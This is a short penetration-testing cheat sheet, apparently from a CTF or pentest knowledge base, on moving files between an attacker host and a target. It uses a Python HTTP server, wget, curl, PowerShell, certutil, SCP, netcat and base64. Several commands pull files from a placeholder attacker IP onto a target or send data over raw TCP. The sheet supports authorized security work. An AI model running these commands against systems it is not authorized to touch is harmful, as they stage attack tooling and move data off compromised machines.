# 📦 File Transfer Cheat Sheet

## Python HTTP Server

On attacker:

```bash
cd /path/containing/file
python3 -m http.server 8000
```

Linux target:

```bash
wget http://<ATTACKER_IP>:8000/<FILE>
curl http://<ATTACKER_IP>:8000/<FILE> -o <FILE>
```

Windows target:

```powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/<FILE> -OutFile <FILE>
```

or:

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/<FILE> <FILE>
```

## SCP

Requires valid SSH credentials:

```bash
# Upload
scp <FILE> <USER>@<TARGET_IP>:/tmp/<FILE>

# Download
scp <USER>@<TARGET_IP>:/path/to/<FILE> .
```

## Netcat

Receiver:

```bash
nc -lvnp 9001 > file.bin
```

Sender:

```bash
nc <RECEIVER_IP> 9001 < file.bin
```

## Base64 Small Files

Useful when direct download is blocked but text can be copied through the available channel.

Encode:

```bash
base64 <FILE> -w 0
```

Decode:

```bash
echo '<BASE64>' | base64 -d > <FILE>
```

PowerShell decode:

```powershell
[IO.File]::WriteAllBytes('<FILE>',[Convert]::FromBase64String('<BASE64>'))
```

## Quick Choice

```text
HTTP available? → Python server + wget/curl/IWR
SSH creds? → SCP
Only raw TCP? → Netcat
Tiny file / awkward channel? → Base64
```

## Validate the Transfer

Prefer SHA-256 for integrity verification:

```bash
# Run on both source and destination
file <FILE>
sha256sum <FILE>
```

Matching hashes confirm byte-for-byte integrity. Then, when appropriate:

```bash
chmod +x <FILE>
```

Record what was transferred and remove temporary tooling or servers when finished.

Detailed notes: [File Transfer](../knowledge-base/exploitation/file-transfer.md)

Only transfer tooling permitted by the engagement, competition, or lab rules.
